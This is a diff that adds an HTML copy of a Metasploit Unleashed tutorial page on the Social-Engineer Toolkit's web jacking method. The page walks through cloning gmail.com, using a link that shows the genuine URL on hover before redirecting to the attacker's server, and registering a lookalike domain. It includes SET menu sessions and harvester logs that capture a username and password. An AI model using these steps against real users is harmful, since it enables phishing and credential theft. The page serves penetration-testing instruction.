@@ -1,0 +1,76 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>Web Jacking Attack Method</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Web
+Jacking Attack Method</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">The web jacking attack method will
+create a website clone and
+present the victim with a link stating that the website has moved. This
+is a new feature to SET version 0.7. When you hover over the link, the
+URL will be presented with the real URL, not the attackers machine. So
+for example if you're cloning gmail.com, the url when hovered over
+would display gmail.com. When the user clicks the moved link, gmail
+opens and then is quickly replaced with your malicious webserver.
+Remember, you can change the timing of the webjacking attack in the
+config/set_config flags.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">1. The Java Applet Attack Method<br>2. The Metasploit Browser Exploit Method<br>3. Credential Harvester Attack Method<br>4. Tabnabbing Attack Method<br>5. Man Left in the Middle Attack Method<br>6. Web Jacking Attack Method<br>7. Multi-Attack Web Method<br>8. Return to the previous menu<br><br>Enter your choice (press enter for default): 6<br><br><br>The first method will allow SET to import a list of pre-defined<br>web applications that it can utilize within the attack.<br><br>The second method will completely clone a website of your choosing<br>and allow you to utilize the attack vectors within the completely<br>same web application you were attempting to clone.<br><br>The third method allows you to import your own website, note that you<br>should only have an index.html when using the import website<br>functionality.<br><br>[!] Website Attack Vectors [!]<br><br>1. Web Templates<br>2. Site Cloner<br>3. Custom Import<br>4. Return to main menu<br><br>Enter number (1-4): 2<br><br>SET supports both HTTP and HTTPS<br>Example: http://www.thisisafakesite.com<br>Enter the url to clone: https://gmail.com<br><br>[*] Cloning the website: https://gmail.com<br>[*] This could take a little bit...<br><br>The best way to use this attack is if username and password form<br>fields are available. Regardless, this captures all POSTs on a website.<br>[*] I have read the above message. [*]<br><br>Press {return} to continue.<br><br>[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.<br>[*] Social-Engineer Toolkit Credential Harvester Attack<br>[*] Credential Harvester is running on port 80<br>[*] Information will be displayed to you as it arrives below:</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">When the victim goes to the site
+he/she will notice the link below, notice the bottom left URL, its
+gmail.com.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="color: rgb(0, 0, 0);" class="center">
+<div class="floatnone"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/File:SET_07.png"
+ class="image"><img alt="SET 07.png"
+ src="http://www.offensive-security.com/w/images/b/b6/SET_07.png"
+ width="1044" height="740"></a></div>
+</div>
+<p style="color: rgb(0, 0, 0);"><br>
+<br>
+When the victim clicks the link he is presented with the following
+webpage:
+<br>
+<br>
+</p>
+<div style="color: rgb(0, 0, 0);" class="center">
+<div class="floatnone"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/File:SET_08.png"
+ class="image"><img alt="SET 08.png"
+ src="http://www.offensive-security.com/w/images/4/40/SET_08.png"
+ width="1440" height="659"></a></div>
+</div>
+<p style="color: rgb(0, 0, 0);"><br>
+<br>
+If you look at the URL bar, we are at our malicious web server. In
+cases with social-engineering, you want to make it believable so using
+an IP address is generally a bad idea. My recommendation is that if
+you're doing a penetration test, register a name that is similar to the
+victim so for gmail you could do gmai1.com (notice the 1), something
+similar that can mistake the user into thinking it&#8217;s the legitimate
+site. Most of the time they won&#8217;t even notice the IP address, but it's
+just another way to ensure it goes on without a hitch. Now that the
+victim enters the username and password in the fields, you will notice
+that we can intercept the credentials.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.<br>[*] Social-Engineer Toolkit Credential Harvester Attack<br>[*] Credential Harvester is running on port 80<br>[*] Information will be displayed to you as it arrives below:<br><br>172.16.32.131 - - [09/Sep/2010 12:15:13] "GET / HTTP/1.1" 200 -<br>172.16.32.131 - - [09/Sep/2010 12:15:56] "GET /index2.html HTTP/1.1" 200 -<br>[*] WE GOT A HIT! Printing the output:<br>PARAM: ltmpl=default<br>PARAM: ltmplcache=2<br>PARAM: continue=https://mail.google.com/mail/?<br>PARAM: service=mail<br>PARAM: rm=false<br>PARAM: dsh=-7017428156907423605<br>PARAM: ltmpl=default<br>PARAM: ltmpl=default<br>PARAM: scc=1<br>PARAM: ss=1<br>PARAM: timeStmp=<br>PARAM: secTok=<br>PARAM: GALX=0JsVTaj70sk<br>POSSIBLE USERNAME FIELD FOUND: Email=thisismyusername<br>POSSIBLE PASSWORD FIELD FOUND: Passwd=thisismypassword<br>PARAM: rmShown=1<br>PARAM: signIn=Sign+in<br>PARAM: asts=<br>[*] WHEN YOUR FINISHED. HIT CONTROL-C TO GENERATE A REPORT</pre>
+<br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/SET"
+ title="SET">SET</a></div>
+</body>
+</html>
